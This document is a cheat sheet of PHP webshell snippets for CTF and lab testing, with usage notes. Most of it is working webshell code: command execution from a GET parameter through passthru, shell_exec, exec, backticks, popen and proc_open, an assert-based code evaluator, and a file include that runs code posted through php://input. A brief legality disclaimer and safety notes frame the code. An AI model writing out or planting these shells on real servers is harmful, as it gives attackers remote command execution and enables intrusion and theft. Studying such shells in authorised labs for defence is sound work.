
# PHP webshell snippets and quick usage

Use these snippets only in safe, legal testing environments (CTFs/labs you own or have permission to test). They demonstrate common PHP remote command execution patterns and simple usage notes.

1) Quick info & environment checks

```php
<?php phpinfo(); ?>
```

```php
<?php echo ini_get('disable_functions'); ?>
```

2) Simple command execution via GET parameter

```php
<?php
if (isset($_GET['cmd'])) {
	echo "<pre>";
	passthru($_GET['cmd']);
	echo "</pre>";
}
?>
```

Usage: GET /shell.php?cmd=id

3) Alternatives for command execution (choose one)

shell_exec version:
```php
<?php
if (isset($_GET['cmd'])) {
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

exec version (captures output array):
```php
<?php
if (isset($_GET['cmd'])) {
	$out = [];
	exec($_GET['cmd'], $out);
	echo "<pre>" . implode("\n", $out) . "</pre>";
}
?>
```

backtick operator:
```php
<?php
if (isset($_GET['cmd'])) {
	echo "<pre>" . `$_GET['cmd']` . "</pre>";
}
?>
```

4) popen / proc_open (streamed output)

popen example:
```php
<?php
if (isset($_GET['cmd'])) {
	$fp = popen($_GET['cmd'], 'r');
	echo "<pre>";
	while (!feof($fp)) { echo htmlspecialchars(fread($fp, 1024)); }
	pclose($fp);
	echo "</pre>";
}
?>
```

proc_open example:
```php
<?php
if (isset($_GET['cmd'])) {
	$descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
	$p = proc_open($_GET['cmd'], $descriptors, $pipes);
	if (is_resource($p)) {
		echo "<pre>" . stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]) . "</pre>";
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($p);
	}
}
?>
```

5) Assert (older technique, can evaluate PHP code)

```php
<?php
if (isset($_GET['cmd'])) {
	assert($_GET['cmd']);
}
?>
```

Use: ?cmd=system('id');

6) File include trick (useful for uploading code via php://input)

```php
<?php
if (isset($_GET['file'])) {
	include($_GET['file']);
}
?>
```

Usage: POST PHP code to the body and call ?file=php://input

Notes and safety
- Wrap outputs in <pre> and consider htmlspecialchars to avoid HTML injection.
- Modern PHP installations often disable dangerous functions (see ini_get('disable_functions')).
- `assert()` may be disabled or behave differently depending on PHP version and configuration.
- Avoid using these on real targets. Only test in authorized labs. Remove any webshells once testing is complete.

References
- OWASP and local lab guidelines for secure testing and responsible disclosure.










